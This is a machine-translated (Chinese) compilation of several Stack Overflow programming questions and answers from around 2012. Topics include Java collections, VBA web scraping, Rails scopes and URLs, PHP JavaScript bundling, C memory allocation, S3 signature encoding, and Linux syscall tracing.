    public void setItemID(String itemID) {
        this.itemID = itemID;
    }

    /**
     * @return the desc
     */
    public String getDesc() {
        return desc;
    }

    /**
     * @param desc the desc to set
     */
    public void setDesc(String desc) {
        this.desc = desc;
    }

    /**
     * @return the cost
     */
    public double getCost() {
        return cost;
    }

    /**
     * @param cost the cost to set
     */
    public void setCost(double cost) {
        this.cost = cost;
    }

    /**
     * @return the quantity
     */
    public int getQuantity() {
        return quantity;
    }

    /**
     * @param quantity the quantity to set
     */
    public void setQuantity(int quantity) {
        this.quantity = quantity;
    }

    /* (non-Javadoc)
     * @see java.lang.Object#toString()
     */
    @Override
    public String toString() {
        return "Item [itemID=" + itemID + ", desc=" + desc + ", cost=" + cost
                + ", quantity=" + quantity + "]";
    }

} 
```

还有我的销售课：

```
import java.util.*;

public class Sales {

    /**
     * @param args
     */
    public static void main(String[] args) {
        int i;

        Item[] items = new Item[5];

        for(i = 0; i < items.length; i++)
        {
            items[i]= new Item(); // create array 
        }

        //hard-coded values of id, desc, cost, qty
        items[0].setItemID("PN250");
        items[1].setItemID("ER100");
        items[2].setItemID("PP150");
        items[3].setItemID("MK200");
        items[4].setItemID("PN300");

        items[0].setDesc("Pen");
        items[1].setDesc("Eraser");
        items[2].setDesc("Paper");
        items[3].setDesc("Marker");
        items[4].setDesc("Pen");

        items[0].setCost(1.50);
        items[1].setCost(1.25);
        items[2].setCost(3.75);
        items[3].setCost(2.50);
        items[4].setCost(2.25);

        items[0].setQuantity(0);
        items[1].setQuantity(175);
        items[2].setQuantity(310);
        items[3].setQuantity(75);
        items[4].setQuantity(450);

        double total = 0;
        for(Item d : items)
        {

            System.out.print(d.getItemID());
            System.out.print("\t" + d.getDesc());
            System.out.print("\t" + d.getCost());
            System.out.println("\t" + d.getQuantity());
        }

        List<Item> obj;
        obj = new ArrayList<Item>();

    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T22:24:13.917

您可以使用以下内容将数组添加到列表中：

```
obj.addAll(Arrays.asList(items)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T22:23:28.077

您可以使用：

```
for (i = 0; i < items.length; i++)
{
    obj.add(items[i]);
} 
```

但为什么不在项目创建和填充后立即添加？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T22:32:24.440

与其在函数开头创建数组，不如创建一个 arrayList 并使用 put 方法向其中添加对象。

此外，您应该考虑使您的对象不可变并将它们的属性传递给它们的构造函数，而不是为每个属性调用 setter

# javascript - VBA 中有没有办法获取由 javascript 生成的元素？

> ID：11820548
> 
> 赞同：0
> 
> 时间：2012-08-05T22:21:11.333
> 
> 标签：javascript, html, ajax, vba

我已经做了几个小时的 Google 侦探工作（包括搜索 StackOverflow），以寻找一种允许在 VBA 中定位由 JavaScript 生成的 HTML 元素的技术。

例如，我**不能**在此使用 ie.Document.getElementById(id)：[http ://www.kisfutures.com/electronic.html?page=quote&sym=NGU12&mode=i](http://www.kisfutures.com/electronic.html?page=quote&sym=NGU12&mode=i)

但是，该方法非常有能力在静态页面上查找元素，正如在 google.com 上测试的那样。

我玩过简单地从 Document.body 获取所有 InnerText，然后解析文件以获得所需的 TD 值，但是在尝试拆分位于不同行的两个值时遇到了障碍。例如，Split(..) 将以下内容理解为“2040”：

```
20
40 
```

据我了解，getElementById(id) 的问题是网站的表格是在页面加载后由 JavaScript 生成的，因此由该 JavaScript 创建的任何元素都不能成为我的 VBA 代码的目标。反正有没有让我的 VBA 代码看到这个 JavaScript 生成的内容？

谢谢您的帮助！

**编辑**

正在使用的 VBA 代码：

```
Function Quote(Market, Parameter)
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Navigate "http://www.kisfutures.com/electronic.html?page=quote&sym=NGU12&mode=i"
    While ie.Busy
        DoEvents
    Wend
    Dim id As String
    id = "dt1_" & Market & "_" & StrConv(Parameter, vbLowerCase)
    Quote = ie.Document.getElementByID(id).InnerText
    ie.Quit
End Function 
```

基本上，我尝试使用 Market 的列标题构建 HTML 元素 ID。因此，例如，如果市场为“NGU12”且列标题为“Open”，则构建的 ID 为：“dt1_NGU12_open”，这是包含市场 NGU12 的“Open”值的 TD 元素的 ID。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T02:13:51.663

正如蒂姆所提到的，尝试访问时静态和动态生成的内容之间应该没有区别。尝试这个：

```
Function Quote(Market, Parameter)
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Navigate "http://www.kisfutures.com/electronic.html?page=quote&sym=NGU12&mode=i"
    While ie.Busy
        DoEvents
    Wend
    Application.Wait Now + TimeSerial(0,0,1) 'Pause 1 second, hopefully
                                             'the dynamic content is 
                                             'generated within this 
                                             'time-frame
    Dim id As String
    id = "dt1_" & Market & "_" & StrConv(Parameter, vbLowerCase)
    Quote = ie.Document.getElementByID(id).InnerText
    ie.Quit
End Function 
```

有更好的停止执行的方法（请参阅 Windows 睡眠 API），但如果您需要更细粒度的控制，我会将其留给您。

此外，如果您想在页面生成后测试特定 id 是否存在，您可以在 IE 中手动加载页面并添加一个包含以下内容的书签作为 URL：

```
javascript:void((function() {var a = document.getElementById(prompt('Please enter an id to test','dt1_NGU12_open')); if (a) {alert('Element found');} else {alert('Element not found')};})()) 
```

# tags - 而是标记 HTML

> ID：11820549
> 
> 赞同：1
> 
> 时间：2012-08-05T22:21:13.300
> 
> 标签：tags, embed, image

我想制作一个允许我显示图像或 swf 的功能，我注意到我可以同时显示嵌入标签，我调查并没有得到任何关于它的信息，使用它有一些缺点吗？

例子：

```
<embed src="image.png" />
<embed src="flash.swf" /> 
```

即使不包括类型，两者都可以工作。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T15:11:23.803

您确实应该将`<img>`标签用于图像而不是`<embed>`. 相反，首先要弄清楚文件类型是什么，然后根据文件类型使用`<img>`OR 。`<embed>`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:39:28.000

可以，但是`<embed>`不建议使用标签。

# java - 使用 FQL 获取一组用户照片

> ID：11820550
> 
> 赞同：0
> 
> 时间：2012-08-05T22:21:17.517
> 
> 标签：java, android, facebook, facebook-fql

我要使用 FQL 获取用户照片的列表（他们已被标记）。基本上我有一个像这样的数组对象：_imageAddressArray。

我可以使用 graphApi 检索用户的照片，所以我知道它可以工作，graphAPi 的问题是它太慢了（100 张照片至少需要 15 秒）。

到目前为止，我有：

```
 //New Stuff
    FQL fql = new FQL(facebook);
    String FQLResult = null;

    try 
    {
        _userGallery = graphApi.getPhotosMy(_noOfPhotos);
        FQLResult = fql.fqlQuery("SELECT object_id, src_small FROM photo");
    } 
    catch (EasyFacebookError e) 
    {
        e.printStackTrace();
    }

    System.out.println("FQL Result" + FQLResult); 
```

这将返回错误：601，有什么想法吗？

当然，理想情况下 FQLResult 将是一个 string[] （字符串数组）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T01:35:13.163

您收到错误是因为您`WHERE`的 FQL 语句中没有引用索引列之一的子句 -[此处显示为“*”](https://developers.facebook.com/docs/reference/fql/photo/)

要使用已标记用户的 FQL 获取照片，请尝试以下操作：

```
SELECT object_id, src_small FROM photo WHERE object_id IN 
  (SELECT object_id FROM photo_tag WHERE subject = me()) 
```

# ruby-on-rails - Rails 中的 URL 参数编码和重写

> ID：11820551
> 
> 赞同：0
> 
> 时间：2012-08-05T22:21:27.903
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, url-rewriting

作为 Ruby 和 Rails 的学习经验，我正在创建一个用于进行投票、存储结果等的网站。作为投票过程的一部分，用户必须通过一些问题并为这些问题提供答案。完成后，他们会收到基于他们提供的答案（答案类型）的建议列表。

我的问题有两个部分。一，我*认为*我走在正确的道路上。另一个，我什至不知道从哪里开始，也不知道这是否是个好主意。

这是我的答案模型：

```
class Answer
  attr_accessor :question_number, :description, :answer
end 
```

**问题 1**

我正在寻找一种方法，当用户提交所有答案（我将他们的响应存储在会话存储中）时，它会转到我的搜索功能 - 但它的编码很好。

代替：

```
http://localhost:3000/results/search?[biglongstringofdifferentanswers] 
```

我想要类似的东西：

```
http://localhost:3000/results/search/1-answer_2-answer_3-answer 
```

在做了一些搜索之后，似乎我想要完成的事情必须使用[#parameterize 方法](http://api.rubyonrails.org/v2.3.8/classes/ActiveSupport/CoreExtensions/String/Inflections.html#M001055)来完成，但我不确定我是否理解如何准确地做到这一点。

**问题2**

我的问题的第二部分是 - 我可以对我的答案进行编码，以便它们不能直接被人类阅读。我想这样做是为了防止人们浏览彼此的答案。例如，第一个答案始终是该人的唯一 ID，我不希望某人能够通过切换参数来浏览任何旧的结果集。

所以，我希望得到一些类似的东西：

```
http://localhost:3000/results/search/798dh832rhhbe89rbfb289f9234972bdbdbbws3 
```

对于第二个问题，我什至不确定这是否是一个好主意，所以我愿意接受对此问题的建议。

在我继续探索/学习 Ruby 和 RoR 时，感谢有关这些问题的任何帮助和指导。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T01:10:47.340

如果我做对了，*则没有任何登录系统，并且您希望**存储在数据库中的*提交答案可以通过用户的 url 访问。您说您不希望用户导航到其他用户的答案，但获取 url 的用户*仍然可以共享它*。

我要做的是通过 POST 方法提交答案，因此您不必担心对参数进行编码等。使用 Rails 变得非常容易。

您可以将 public_id 列添加到您的答案对象，这将是一个生成的大整数。在 post 方法提交之后，一旦您将答案保存在数据库中，您就可以将重定向返回到答案公共 id url。

就像是

```
def create
  answer = Answer.new(params[:answer])
  if answer.save
    answer.generate_public_id # <= would be nice to add if in the answer model 'after_create' filter probably
    return redirect_to public_id_answer_path
  end
  render :partial => 'error'
end 
```

你怎么看 ？

# php - 将 javascript 与 htaccess 和 php 捆绑在一起

> ID：11820555
> 
> 赞同：5
> 
> 时间：2012-08-05T22:21:31.993
> 
> 标签：php, javascript, .htaccess

我目前正在尝试捆绑我的 javascript，以便在页面速度/yslow 方面获得更高的分数。但是我用这种方法遇到了困难。我目前正在使用此[TUTORIAL](http://www.monkeyphysics.com/articles/read/16/bundling_javascript.html)作为捆绑 js 文件的指导。我正在调用 js 文件，但在 firefox 工具中显示该文件`bundle.js`不存在，这是真的，但使用 htaccess 我将文件`bundle.php`从`bundle.js`. 但我没有得到任何结果。有人可以帮我查明问题还是有更好的方法来捆绑 js 文件？

这是我的[示例](http://webprolearner.ueuo.com/imageupload/)。当使用 js 文件正常工作时，它应该显示 4 个用于文件上传的输入字段。

**这就是我调用js文件的方式**

```
<script src='core/bundle.js?js=js/jquery-ui-1.8rc2.custom.min.js,js/globalFunctions.js,js/uploaderPreviewer.js,js/itemForm.js&amp;m=4948599067'>
</script> 
```

**.htacces 更改文件类型***

```
RewriteEngine on
RewriteRule ^bundle.js$ bundle.php [QSA,L] 
```

**核心/bundle.php**

```
include "JSMin.php";
$path    = "../../";
$files   = explode(",", $_GET['js']);
$missing = array();

$cache = '';
foreach ($files as $index => $file) {
    if (strtolower(substr($file, -2)) != 'js') {
        unset($files[$index]);
    } else if (file_exists($path.$file)) {
        $cache .= $file;
        $cache .= filemtime($path.$file);
    } else {
        $missing[] = $file;
        unset($files[$index]);
    }
}

$cache = 'cache/'.md5($cache);

if (count($missing)) {
    header("Content-type: text/javascript");
    header("Pragma: no-cache");
    header("Cache-Control: no-cache");
    echo "alert('Could not load the following javascript source files:\\n\\n- ".implode("\\n- ", $missing)."\\n\\nJavascript not loaded / running!');";
    exit;
}

if (count($files)) {
    // create cached version if not present
    if (!file_exists($cache)) {
        $js = '';
        foreach ($files as $file) {
            $js .= JSMin::minify(file_get_contents($path.$file));
        }

        file_put_contents($cache, $js);
    }

    // calculate last-modified & etag send caching headers
    $last_modified_time = filemtime($cache);
    $etag = md5_file($cache);

    header("Content-type: text/javascript");
    header("Pragma: public");
    header("Cache-Control: public");
    header("Last-Modified: ".gmdate("D, d M Y H:i:s", $last_modified_time)." GMT");
    header("Etag: ".$etag); 

    if (@strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']) == $last_modified_time || trim($_SERVER['HTTP_IF_NONE_MATCH']) == $etag) { 
        header("HTTP/1.1 304 Not Modified");
        exit;
    }

    readfile($cache);
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-06T07:18:03.340

这是我多年来成功使用的内容（不需要 .htaccess）：

在 html 中：

```
<script type = "text/javascript" src = "js/scripts.php?build=12345&load=script1,script2,script3,folder/script4"> </script> <!-- do not specify the .js extension --> 
```

在 php（文件 scripts.php）中：

```
<?php
error_reporting(E_ERROR);
// see http://web.archive.org/web/20071211140719/http://www.w3.org/2005/MWI/BPWG/techs/CachingWithPhp
// $lastModifiedDate must be a GMT Unix Timestamp
// You can use gmmktime(...) to get such a timestamp
// getlastmod() also provides this kind of timestamp for the last
// modification date of the PHP file itself
function cacheHeaders($lastModifiedDate) {
    if ($lastModifiedDate) {
        if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) && strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']) >= $lastModifiedDate) {
            if (php_sapi_name()=='CGI') {
                Header("Status: 304 Not Modified");
            } else {
                Header("HTTP/1.0 304 Not Modified");
            }
            exit;
        } else {
            $gmtDate = gmdate("D, d M Y H:i:s \G\M\T",$lastModifiedDate);
            header('Last-Modified: '.$gmtDate);
        }
    }
}

// This function uses a static variable to track the most recent
// last modification time
function lastModificationTime($time=0) {
    static $last_mod ;
    if (!isset($last_mod) || $time > $last_mod) {
        $last_mod = $time ;
    }
    return $last_mod ;
}

lastModificationTime(filemtime(__FILE__));
cacheHeaders(lastModificationTime());
header("Content-type: text/javascript; charset: UTF-8");

ob_start ("ob_gzhandler");

foreach (explode(",", $_GET['load']) as $value) {
    if (is_file("$value.js")) {
        $real_path = mb_strtolower(realpath("$value.js"));
        if (strpos($real_path, mb_strtolower(dirname(__FILE__))) !== false || strpos($real_path, mb_strtolower(dirname(dirname(__FILE__)).DIRECTORY_SEPARATOR.'modules'.DIRECTORY_SEPARATOR)) !== false) {
            lastModificationTime(filemtime("$value.js"));
            include("$value.js");echo "\n";
        } 
    }
}
?> 
```

这会压缩、合并和缓存 js 文件

# dynamic - 学习动态分配

> ID：11820556
> 
> 赞同：0
> 
> 时间：2012-08-05T22:21:33.980
> 
> 标签：dynamic

我正在尝试学习 C 并编写了一个简单的程序，该程序接受来自用户的字符串并打印它。你愿意就我的做法向我提出任何建议吗？我需要很好地学习它。所以请帮助我提高自己。这是我的代码：

```
//Dynamic Array Allocation
#include <stdio.h>  //this is a c code
#include <conio.h>  //for using getch()
#include <stdlib.h> //for using malloc,realloc, and free

void createACopy(char * copyTo,char * copyFrom, int length) //creates copy
{
    for(int i = 0; i < length; i++) //loof for 'length' times
    {
        copyTo[i] = copyFrom[i];
    }
}

void main()
{
    printf("Please enter a string\n");
    char inputChar; //a characted input by user
    int inputLength = 0;    //holds the length of characters input so far
    char * userInput;   //a pointer that points to the beginnning of the user input
    userInput = (char *)malloc(sizeof(char));   //dynamically assign a single character size memory to the pointer
    if (userInput == NULL)  //if malloc could not find sufficient memory
    {
       free (userInput);    //free the memory
       puts ("Error Allocating memory");    //print error message
       exit (1);    //exit the program
     }
    do{ //keep looping till the user hits 'Enter' key
    inputChar = getch();    //get the character keyed in by user in inputChar variable
    if(inputChar ==char(8)) //if user hits backspace
    {
        inputLength--;  //decrease the length of user input by 1
        continue;   //continue and look for next character
    }
    char * storeOldInputHere = (char *) malloc(inputLength+1);  //dynamically find a memory location of size 'inputLenght'
    if (storeOldInputHere == NULL)  //if malloc could not find sufficient memory
    {
       free (storeOldInputHere);
       puts ("Error Allocating memory for copying the old input");
       exit (1);
     }
    createACopy(storeOldInputHere,userInput,inputLength);   //store the old Input here because realloc might give us a different location altogether.
    userInput = (char *) realloc(userInput,inputLength+2);  //now after we got a new character, reallocate memory.
    if (userInput == NULL)  //if realloc could not find sufficient memory
    {
       free (userInput);
       puts ("Error Reallocating memory");
       exit (1);
     }
    createACopy(userInput, storeOldInputHere,inputLength);  //Copy back the original input string to the newly allocated space again.
    userInput[inputLength] = inputChar; //append the new character user inserted.
    free (storeOldInputHere);   //free the storeOldInputHere
    inputLength ++; //increment the length counter by 1
    }while(inputChar != char(13));  //keep looping untill user hits 'Enter' key
    userInput[inputLength] = '\0';  //append a null charater at the end of the string
    printf("\nyou entered %d characters",inputLength);
    printf("\nyou entered: %s\n",userInput);
    free(userInput);    //free the userInput
} 
```

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:40:13.637

很多东西需要改进，但现在有一些建议：

首先，在 C 中逐个字符地做任何事情都是乏味且容易出错的，如果你能避免它，你应该这样做。一般来说，我更喜欢 fprintf 而不是 puts，以及 readline 或 getline 而不是 getch。

其次，在使用 malloc 时，您应该始终将它传递给您正在使用的数据类型的大小。

例如

```
size_t counter = 0;
//then some stuff happens in your code and counter gets set to some value...say 24
char * charspace = (char *) malloc(sizeof(char)*counter); 
// charspace is now an array with space for 24 chars. 
```

将错误检查封装在一个函数中也是一种很好的做法，这样您就不必担心它了。

例如

```
void *emalloc(size_t n) {
void *p;
p = malloc(n);
if (p == NULL) {
    fprintf(stderr, "emalloc of %u bytes failed", (unsigned int) n);
    exit(1);
}
return p;
} 
```

希望有帮助。

# python - 不一致的 SignatureDoesNotMatch Amazon S3 与 django-pipeline、s3boto 和存储

> ID：11820566
> 
> 赞同：3
> 
> 时间：2012-08-05T22:23:48.237
> 
> 标签：python, django, amazon-s3, boto, django-storage

我有 2 个由 django-pipeline 和 s3boto 编译的文件：master.css 和 master.js。它们在我的存储桶中设置为“公共”。但是，当我访问它们时，有时会提供 master.css，有时会出现 SignatureDoesNotMatch 错误。与 master.js 相同。这不会在 Chrome 上发生。我会错过什么？

**编辑**：它现在也发生在 Chrome 上。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-04T10:59:38.350

也发生在我身上......花了几个小时才找到，但我最终想通了。事实证明，如果正确的签名是：

ssCNsAOxLf5vA80ldAI3M0CU2%2Bw=

那么 AWS 将不接受：

ssCNsAOxLf5vA80ldAI3M0CU2+w=

唯一的区别是将 %2B 转换为“+”。

S3BotoStorage 实际上正确地产生了它，但编码发生在 url 方法 ( `return unquote(final_url)`) 的最后一行的 CachedFilesMixin 上。为了修复它，我派生了一个新的 CachedFilesMixin 来撤消“损坏”（我应该提到我不知道为什么这个取消引用首先存在，所以撤消它可能会导致其他问题）

```
class MyCachedFilesMixin(CachedFilesMixin):
def url(self, *a, **kw):
    s = super(MyCachedFilesMixin, self).url(*a, **kw)
    if isinstance(s, unicode):
        s = s.encode('utf-8', 'ignore')
    scheme, netloc, path, qs, anchor = urlparse.urlsplit(s)
    path = urllib.quote(path, '/%')
    qs = urllib.quote_plus(qs, ':&=')
    return urlparse.urlunsplit((scheme, netloc, path, qs, anchor)) 
```

我在哪里使用我在[这里](https://stackoverflow.com/questions/120951/how-can-i-normalize-a-url-in-python)找到的代码。

希望这可以帮助...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-19T19:44:03.567

在使用 S3 签名 URL 和 python 请求 HTTP 库下载文件时，我遇到了导致 SignatureDoesNotMatch 错误的类似问题。

我的问题最终变成了一个糟糕的内容类型。AWS 上关于[Authenticating REST Requests](http://s3.amazonaws.com/doc/s3-developer-guide/RESTAuthentication.html)的文档帮助我解决了这个问题，并提供了 Python 示例。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-12-20T21:50:10.693

我为此苦苦挣扎了一段时间，我不喜欢弄乱 CachedFilesMixin 的想法（对我来说似乎有点矫枉过正）。

在 django 平台发布适当的修复之前，我发现引用签名两次是一个不错的选择。我知道它不漂亮，但它很有效而且很简单。

所以你只需要做这样的事情：

```
signature = urllib.quote_plus(signature.strip())
signature = urllib.quote_plus(signature.strip()) 
```

希望能帮助到你！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-02T22:28:37.190

这篇关于 Flask 的文章是获取正确签名的好资源：[https ://devcenter.heroku.com/articles/s3-upload-python](https://devcenter.heroku.com/articles/s3-upload-python)

```
@app.route('/sign_s3/')
def sign_s3():
    AWS_ACCESS_KEY = os.environ.get('AWS_ACCESS_KEY_ID')       
    AWS_SECRET_KEY = os.environ.get('AWS_SECRET_ACCESS_KEY')
    S3_BUCKET = os.environ.get('S3_BUCKET')

    object_name = request.args.get('s3_object_name')
    mime_type = request.args.get('s3_object_type')

    expires = int(time.time()+10)
    amz_headers = "x-amz-acl:public-read"

    put_request = "PUT\n\n%s\n%d\n%s\n/%s/%s" % (mime_type, expires, amz_headers, S3_BUCKET, object_name)

    signature = base64.encodestring(hmac.new(AWS_SECRET_KEY,put_request, sha).digest())
    signature = urllib.quote_plus(signature.strip())

    url = 'https://%s.s3.amazonaws.com/%s' % (S3_BUCKET, object_name)

    return json.dumps({
        'signed_request': '%s?AWSAccessKeyId=%s&Expires=%d&Signature=%s' % (url, AWS_ACCESS_KEY, expires, signature),
         'url': url
    }) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-08-05T19:15:41.393

对我来说简单的解决方法是生成一个只有字母数字字符的新访问密钥（即没有 AWS 有时会添加到密钥中的特殊字符，例如“/”、“+”等）。

# ruby-on-rails-3 - Rails 3：使用范围在索引视图上构建一组过滤器

> ID：11820569
> 
> 赞同：1
> 
> 时间：2012-08-05T22:23:53.707
> 
> 标签：ruby-on-rails-3, activerecord, arel

我有一个模型的索引视图，我想通过模型属性的某种组合进行过滤。

例如，我有一个账单模型（不是鸭子上的那种，你必须支付的那种），我可能会根据收款人和/或状态进行过滤。

该模型对每个单独的属性都有一个范围，例如

```
scope :bill_status, lambda {|status| where("status = ?", status}
scope :bill_payee, lambda {|payee| where("payee_id = ?", payee.id} 
```

该视图允许用户选择*零个或多个*选项——如果未选择一个选项，则表示“不按此过滤”。

在控制器中，我可以做一些像这样令人讨厌的事情：

```
def index
  status = params[:bill][:status]
  payee = params[:bill][:payee]
  if status.present? and payee.present?
    # chain scopes
    @bills = Bill.bill_status(status).bill_payee(payee)
  elsif status.present?
    @bills = Bill.bill_status(status)
  elsif payee.present?
    @bills = Bill.bill_payee(payee)
  else
    @bills = Bill.all
  end

  # rest of controller action
end 
```

但是，虽然这可行，但它既不美观也不易于扩展——添加第三个过滤器意味着我现在有更多的可能性。我追求美丽和纯洁。

假设我的范围都是可链接的，看来我应该能够做类似的事情

```
def index
  @bills = Bill.all
  @bills = @bills.bill_status(params[:bill][:status]) if params[:bill][:status].present?
  @bills = @bills.bill_payee(params[:bill][:payee]) if params[:bill][:payee].present?

  # rest of controller code
end 
```

'cept 它不起作用，因为它`Bill.all`是一个数组。另外，这并不好玩，因为`Bill.all`执行查询，由于 AREL 的魔法，我只想运行一次。我应该只定义一个范围`all_bills`（没有条件吗？）——`ActiveRecord::Relation`我猜那是...

有没有更优雅地解决这个问题的模式？每当我有代码来做一件依赖于模型、视图和控制器的事情时，我都会觉得我可能做错了什么。或者好像比我更聪明、更努力的人已经解决了它:-)

额外的问题：我希望这一切都能与我选择的分页器一起使用，这是最优秀的 Kaminari 宝石。

欢迎所有想法和想法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-06T09:54:22.613

我会做这样的事情：

```
proxy = Bill.scoped
if status.present?
  proxy = proxy.bill_status(status)
end
if payee.present?
  proxy = proxy.bill_payee(payee)
end

@bills = proxy 
```

你甚至可以做一些元编程：

```
@bills = [:status, :payee, ...].inject(Bill.scoped) do |proxy, param|
  val = params[:bill][param]
  val.present ? proxy.send("bill_#{param}", val) : proxy
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-06T13:01:32.597

当我寻找看似常见问题的解决方案时，我查看了 Ryan Bates 的[RailsCast 并在 Ransack 上找到了 3 天前的一集](http://railscasts.com/episodes/370-ransack)。Ransack 是用于表单搜索和列排序的非常酷的宝石，我认为这就是我要走的路。

感谢这里的答案——我很高兴从那些花时间和精力回答问题的人那里学到了一些很棒的技巧。

# objective-c - 写入 NSUserDefault 和 .plist 失败

> ID：11820572
> 
> 赞同：0
> 
> 时间：2012-08-05T22:24:15.263
> 
> 标签：objective-c, xcode, plist, nsuserdefaults

我无法在 .plist 和 NSUser 默认文件中获取一些信息。
对于我已经发布的.plist，但似乎没有什么问题：

[如何将数组集更新到 .plist 字典中](https://stackoverflow.com/questions/11744160/how-to-update-an-array-set-into-the-plist-dictionary)

对于 NSUser Default，我正在做这样的事情：

```
NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
NSMutableArray *userSettings = [[NSMutableArray alloc]initWithArray:[[defaults objectForKey:@"userSettings"]mutableCopy]];

[userSettings addObject:userSettingsArray];//adding an array into my userSettingsArray (declared higher in the code)
[defaults setValue:userSettings forKey:@"userSettings"];
[defaults synchronize]; 
```

我在徘徊，Xcode 中是否有任何选项允许或不允许用户写入应用程序文件夹？

我有点卡在这里

谢谢您的帮助，

蒂姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:31:23.017

我找到了解决问题的方法：我像这样从 IBOutlet 输入数据

```
[self.tempUserSettings insertObject:self.firstName atIndex:1]; 
```

而不是这个：

```
[self.tempUserSettings insertObject:self.firstName.text atIndex:1]; 
```

所以数据是错误的，等等……

谢谢你的帮助，从那些 .plist 和 NSUserDefault 中学到了很多东西

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T13:16:31.877

利用

```
[defaults setObject:userSettings forKey:@"userSettings"]; 
```

代替

```
[defaults setValue:userSettings forKey:@"userSettings"]; 
```

# c - 是否可以实时监控linux下的所有系统调用？

> ID：11820578
> 
> 赞同：3
> 
> 时间：2012-08-05T22:24:29.050
> 
> 标签：c, linux, linux-kernel, system-calls

例如，在 linux-machine 中有很多进程。每个都可以使用系统调用，但通常很少使用。那么，有一种工具或方法可以显示何时使用系统调用以及与哪个进程相关联？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-05T22:28:42.003

您可以使用各种工具，例如`strace`和`ltrace`许多其他工具，但我不确定您是否要同时跟踪所有进程。

通常你会附加到一个感兴趣的进程并遵循它的系统调用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-06T18:03:26.040

您可以使用 Linux 内核审计子系统。

例如，要查看一个名为 sshd (pid - 12345) 的程序进行的所有系统调用：

```
# auditctl -a entry,always -S all -F pid=12345 
```

# java - 简单的 Java OOP 类错误

> ID：11820586
> 
> 赞同：-1
> 
> 时间：2012-08-05T22:26:13.190
> 
> 标签：java, class, object, methods

我正在尝试使用 Java OOP 类、对象和方法来打印我的名字。下面是我正在使用的两个脚本。屏幕上没有显示任何内容。我正在使用 Netbeans IDE。

```
package name;
public class Begin {
    public static void displayName(){
        System.out.print("Say My Name");
    }
} 
```

============================

```
package usename;
 import name.Begin;
public Useaname {
    public static void main(String[] args){
       Begin.displayName();
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T22:29:18.413

您`class`在“Useaname”类声明中缺少 。

```
public class Useaname { 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-06T05:15:19.433

您的用户名之前的关键字在哪里`class`？:)

```
public class Useaname {
    public static void main(String[] args) {
        Begin.displayName();
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T22:27:33.923

您必须声明该方法`static`才能像`Begin.displayName()`.

```
public static void displayName() { 
```

这告诉使方法成为类的函数，而不是类的任何特定实例。

或者，您可以实例化一个对象来调用该方法：

```
Begin begin = new Begin();
begin.displayName(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-05-03T06:46:57.580

`class`您错过了 class name 之前的关键字`Useaname`。这是解决方案代码。

```
package usename;

import name.Begin;

public class Useaname {

    public static void main(String[] args) {
       Begin.displayName();
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-04-22T06:52:36.090

您没有在“usename”之前使用关键字“class”

```
package usename;
 import name.Begin;
public Useaname {
    public static void main(String[] args){
       Begin.displayName();
    }
} 
```

**更正**

```
package usename;
 import name.Begin;
public class Useaname {
    public static void main(String[] args){
       Begin.displayName();
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-05T22:28:05.910

此代码不应编译。

`Begin.displayName();`试图调用静态方法 - 你没有这样的东西:)。

你必须有办法 - 创建新`Begin`对象并在其上调用方法 -`new Begin().displayName()`

或声明`displayName`为静态方法。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-05T22:30:57.537

这个问题至少有两种解决方案：

(1) 您可以将`displayName()`方法设为静态。这将允许您使用类名来调用它。

```
public static void displayName() { 
  // snip
} 
```

(2) 您可以从您的类中创建一个对象`Begin`以调用非静态成员方法：

```
public static void main(String[] args){
  Begin b = new Begin();

  b.displayName();  
} 
```

总而言之，您应该了解对象和对象创建，作为理解 Java 和 OOP 的开始步骤。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-08-05T22:31:36.773

您可以在 displayName() 方法上使用静态修饰符或创建 Begin 类的新实例：

```
package usename;

public class Useaname {
    public static void main(String[] args){
       Begin begin = new Begin();
       begin.displayName();
    }
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-01-17T18:43:20.207

您忘记在用户名之前添加**类**

```
package username;
import name.Begin;
public class username{
      public static void main(String[] args){
            Begin.displayName();
      }
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2018-01-06T15:36:56.923

你忘了`class`关键字！你可以为类创建对象`Begin`

```
 import name.Begin;
public class Usaname
{
    public static void main(String []args)
    {
          Begin ob = new Begin();
          ob.displayName();
    }
} 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2021-05-16T14:36:06.227

What you are missing here is the `class` keyword before Username class declaration

